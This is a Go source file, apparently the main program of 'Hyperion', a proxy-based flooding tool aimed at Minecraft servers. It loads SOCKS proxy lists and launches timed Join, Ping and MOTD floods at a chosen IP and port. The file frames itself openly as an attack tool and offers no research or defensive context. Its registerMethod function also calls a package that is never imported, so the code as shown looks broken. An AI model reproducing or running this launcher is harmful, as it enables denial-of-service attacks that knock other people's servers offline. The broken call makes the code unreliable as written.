package main

import (
	"Hyperion/core/method/methods"
	"Hyperion/core/proxy"
	"flag"
	"fmt"
	"log"
	"time"
)

var (
	ip       = flag.String("ip", "0.0.0.0", "sets ip")
	port     = flag.String("port", "25565", "sets port")
	protocol = flag.Int("protcol", 761, "sets version protocol")
	duration = flag.Int("duration", 600, "duration in sec")
	cpp      = flag.Int("cpp", 5, "no of conn per proxy per delay")
	delay    = flag.Int("delay", 1, "delay in sec")
	loops    = flag.Int("loops", 1, "loops")
	perDelay = flag.Int("per", 1000, "per delay")
)

func main() {
  
	fmt.Println("██╗░░█╗██╗░░░██╗██████╗░███████╗██████╗░██╗░█████╗░███╗░░██╗\n██║░░██║╚██╗░██╔╝██╔══██╗██╔════╝██╔══██╗██║██╔══██╗████╗░██║\n███████║░╚████╔╝░██████╔╝█████╗░░██████╔╝██║██║░░██║██╔██╗██║\n██╔══██║░░╚██╔╝░░██╔═══╝░██╔══╝░░██╔══██╗██║██║░░██║██║╚████║\n██║░░██║░░░██║░░░██║░░░░░███████╗██║░░██║██║╚█████╔╝██║░╚███║\n╚═╝░░╚═╝░░░╚═╝░░░╚═╝░░░░░╚══════╝╚═╝░░╚═╝╚═╝░╚════╝░╚═╝░░╚══╝\n  Also try Ares!\n  Made by AnAverageBeing\n")
	fmt.Println("  Starting Hyperion...")
	fmt.Println("Parsing arguments...")
	flag.Parse()
	fmt.Println("Parsing proxy:")
  
	proxyManager := proxy.ProxyManager{}
	fmt.Println("socks4...")
	err := proxy.LoadFromFile(proxy.SOCKS4, "socks4.txt", &proxyManager)
	if err != nil {
		log.Fatal(err)
	}
	fmt.Println("socks5...")
	err = proxy.LoadFromFile(proxy.SOCKS5, "socks5.txt", &proxyManager)
	if err != nil {
		log.Fatal(err)
	}
  
	fmt.Println("Preparing to attack...")

	info := methods.AttackInfo{
		Ip:           *ip,
		Port:         *port,
		Protocol:     *protocol,
		Duration:     time.Duration(*duration) * time.Second,
		ConnPerProxy: *cpp,
		Delay:        time.Duration(*delay) * time.Second,
		Loops:        *loops,
		PerDelay:     *perDelay,
	}

	registerMethod(&info, &proxyManager)

	method := methods.Join{
		Info:         &info,
		ProxyManager: &proxyManager,
	}
	method.Start()

  	fmt.Println("  Attack started.")
	time.Sleep(time.Duration(*duration) * time.Second)
	fmt.Println("  Attack ended.")
  
}

func registerMethod(info *methods.AttackInfo, proxyManager *proxy.ProxyManager) {
	method.RegisterMethod(methods.Join{
		Info:         info,
		ProxyManager: proxyManager,
	})
	method.RegisterMethod(methods.Ping{
		Info:         info,
		ProxyManager: proxyManager,
	})
	method.RegisterMethod(methods.MOTD{
		Info:         info,
		ProxyManager: proxyManager,
	})
}
